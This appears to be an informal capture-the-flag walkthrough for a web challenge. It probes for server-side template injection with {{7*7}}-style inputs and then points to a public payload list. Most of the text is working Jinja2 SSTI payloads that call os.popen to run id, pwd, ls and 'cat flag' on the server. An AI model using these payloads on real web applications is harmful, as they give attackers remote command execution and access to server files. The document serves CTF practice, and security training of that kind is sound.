//Talk to our Spider named parrot/

We open dev tools then we check if there is anything 
We open the page source then we also check if there is anything 
then we use {{7*7}}, ${7*7}, <%= 7*7 %>, ${{7*7}} and #{7*7}
after we see which one of the option give us 49
we enter this link https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2
After that we have to find the payload that give us 49 on the github 
The we use this line to test {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }} we change the id to pwd
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }} we change the id to ls 
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }} we change the id to cat flag 
